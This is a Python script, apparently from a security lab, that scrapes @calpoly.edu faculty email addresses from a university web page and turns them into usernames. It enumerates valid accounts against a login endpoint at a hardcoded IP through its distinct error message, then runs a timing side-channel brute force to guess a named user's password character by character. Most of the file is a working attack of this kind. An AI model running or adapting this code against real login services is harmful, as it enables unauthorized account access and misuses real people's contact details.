import csv
import string
import re
import requests
from bs4 import BeautifulSoup
from datetime import datetime
import time 



url = 'https://csc.calpoly.edu/faculty/'

curl_url = "http://129.65.51.244:5000/login"
possible_characters = list(string.ascii_lowercase + string.ascii_uppercase + string.punctuation)

def curl_request(username, password):
    
# Data to send in the POST request
    data = {
        "user": username,
        "password": password
    }

# Send the POST request
    response = requests.post(curl_url, data=data)

# Print the response That username is not associatd with an account.
    response_text = response.text.strip()
    if (response_text) == ("That username is not associatd with an account."):
        return 0
    return username

def scrap(url):
# URL of the webpage to scrape
# Headers to mimic a browser
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
    }

# Send a GET request to the webpage with headers
    response = requests.get(url, headers=headers)
    response.raise_for_status()  # Ensure the request was successful

# Parse the webpage content
    soup = BeautifulSoup(response.text, 'html.parser')

# Convert the soup object to a string
    content = str(soup)

# Define a refined email pattern to avoid concatenated errors
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'

# Find all email addresses in the content
    emails = re.findall(email_pattern, content)

# Remove duplicates by converting the list to a set
    unique_emails = set(emails)

# Sort and filter emails (optional step for clean output)
    filtered_emails = sorted(email for email in unique_emails if '@' in email and '.' in email)
    return filtered_emails
def username():
    filtered_emails = scrap(url)    
    username_list = []
# Print the cleaned email addresses
    for email in filtered_emails:
        if email.endswith('@calpoly.edu'):
            email = email.replace('@calpoly.edu', '')
            username_list.append(email)

    for username in username_list:
        creds = curl_request(username, "hello")
        if (creds):
            print(creds)
            break

def bruteforce(username):

    best_password = "" 
    best_character = ""
    max_time = 0
    for character in possible_characters:
        
        password = ""
        highest_time = 0
        password += character
        password += character
        average_time = 0
        for i in range(0,51):

            start_time = time.time()
            curl_request(username, password)
            end_time = time.time()
            duration = end_time - start_time
            average_time +=duration

        average_time = average_time / 50
        
        if average_time > max_time:
            max_time = average_time
            best_character = character

            print(best_character)

def main():
    bruteforce("ayaank")
if __name__ == "__main__":
    main()
